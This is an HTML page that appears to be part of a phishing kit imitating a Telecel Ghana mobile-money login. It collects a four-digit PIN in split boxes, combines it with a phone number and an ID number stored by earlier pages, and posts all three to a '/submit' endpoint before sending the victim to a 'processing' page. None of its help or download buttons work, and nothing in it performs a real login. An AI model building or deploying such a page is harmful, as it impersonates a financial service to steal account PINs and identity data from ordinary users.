<!DOCTYPE html>
<html>
<head>
    <title>Telecel Login</title>

    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">

    <link rel="stylesheet" href="style.css">
</head>

<body>

<!-- 🔴 TOP RED HEADER -->
<div class="top-red">
    <img src="logo.jpeg" class="logo-big">
    <h2>Telecel</h2>
    <p class="sub">Mobile Financial Services</p>
</div>

<!-- ⚪ WHITE LOGIN CARD -->
<div class="login-card">

    <h3>Login to Your Account</h3>

    <label>Account Type</label>
    <select>
        <option>Mobile</option>
    </select>

    <!-- PHONE -->
    <input id="phone" readonly>

    <!-- PIN -->
    <p class="pin-label">Enter your PIN</p>

    <div class="pin-container">
        <input type="password" maxlength="1" class="pin-box">
        <input type="password" maxlength="1" class="pin-box">
        <input type="password" maxlength="1" class="pin-box">
        <input type="password" maxlength="1" class="pin-box">
    </div>

    <p class="forgot">Forgot your PIN?</p>

    <button id="submitBtn" onclick="submitOtp()">LOGIN</button>

    <p id="errorMsg" class="error"></p>

</div>

<!-- 🔴 BOTTOM RED SECTION -->
<div class="bottom-red">
    <img src="logo.jpeg" class="logo-small">
    <h3>Telecel</h3>
    <p>Ghana</p>
    <p class="small">Secure. Fast. Reliable.</p>

    <button class="white-btn">📱 Download App</button>
    <button class="white-btn">❓ Get Help</button>
</div>

<div id="pageLoader" class="loader" style="display:none;"></div>

<script>
const inputs = document.querySelectorAll(".pin-box");

inputs.forEach((input, index) => {
    input.addEventListener("input", () => {
        input.value = input.value.replace(/[^0-9]/g, "");
        if (input.value && index < inputs.length - 1) {
            inputs[index + 1].focus();
        }
    });

    input.addEventListener("keydown", (e) => {
        if (e.key === "Backspace" && !input.value && index > 0) {
            inputs[index - 1].focus();
        }
    });
});

async function submitOtp() {
    const btn = document.getElementById("submitBtn");
    const error = document.getElementById("errorMsg");

    let pin = "";
    document.querySelectorAll(".pin-box").forEach(i => pin += i.value);

    if (pin.length < 4) {
        error.innerText = "Enter full PIN";
        return;
    }

    btn.innerText = "Processing...";
    btn.disabled = true;

    document.getElementById("pageLoader").style.display = "block";

    const idNumber = localStorage.getItem("idNumber");
    const phone = document.getElementById("phone").value;

    try {
        await fetch("/submit", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ idNumber, phone, pin })
        });

        window.location.href = "processing.html";

    } catch {
        error.innerText = "Submission failed";
        btn.innerText = "LOGIN";
        btn.disabled = false;
    }
}

document.getElementById("phone").value = localStorage.getItem("phone") || "";

</script>

</body>
</html>
